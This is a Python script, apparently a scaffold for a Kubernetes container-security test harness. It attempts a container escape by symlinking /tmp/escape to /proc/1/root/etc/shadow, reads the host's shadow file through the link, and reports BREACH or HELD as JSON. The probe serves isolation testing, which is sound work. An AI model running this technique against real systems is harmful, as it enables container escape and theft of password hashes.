#!/usr/bin/env python3
"""
Attack: fs_symlink — Symlink traversal via /proc/1/root
Category: filesystem

Runs INSIDE a K8s pod. Outputs structured JSON to stdout.
The controller reads pod logs and broadcasts events.

SCAFFOLD — real implementation on hack day.
"""
import json
import os
import sys
import time


def run():
    """
    Attempt to escape container via symlink to host /proc/1/root.

    Technique: Create symlink from /tmp/escape -> /proc/1/root/etc/shadow
    If readOnlyRootFilesystem is false and /proc is not masked, the symlink
    resolves through PID 1's mount namespace to the host filesystem.
    """
    result = {
        "vector": "fs_symlink",
        "category": "filesystem",
        "status": "HELD",
        "evidence": "",
        "duration_ms": 0,
    }

    start = time.time()

    # Step 1: Log what we're doing
    print(json.dumps({"type": "log", "line": "creating symlink /tmp/escape -> /proc/1/root/etc/shadow"}))
    sys.stdout.flush()

    try:
        # Step 2: Attempt the symlink
        target = "/proc/1/root/etc/shadow"
        link = "/tmp/escape"

        if os.path.exists(link):
            os.unlink(link)

        os.symlink(target, link)
        print(json.dumps({"type": "log", "line": "symlink created, attempting read..."}))
        sys.stdout.flush()

        # Step 3: Try to read through the symlink
        with open(link, "r") as f:
            content = f.read(256)

        # If we get here, it's a breach
        result["status"] = "BREACH"
        result["evidence"] = f"read {len(content)} bytes from /etc/shadow via symlink traversal"

    except PermissionError:
        result["evidence"] = "permission denied on /proc/1/root"
    except FileNotFoundError:
        result["evidence"] = "/proc/1/root not accessible (PID namespace isolated)"
    except OSError as e:
        result["evidence"] = f"OS error: {e}"
    finally:
        # Cleanup
        try:
            os.unlink("/tmp/escape")
        except OSError:
            pass

    result["duration_ms"] = int((time.time() - start) * 1000)

    # Final result line — controller parses this
    print(json.dumps({"type": "result", **result}))
    sys.stdout.flush()


if __name__ == "__main__":
    run()
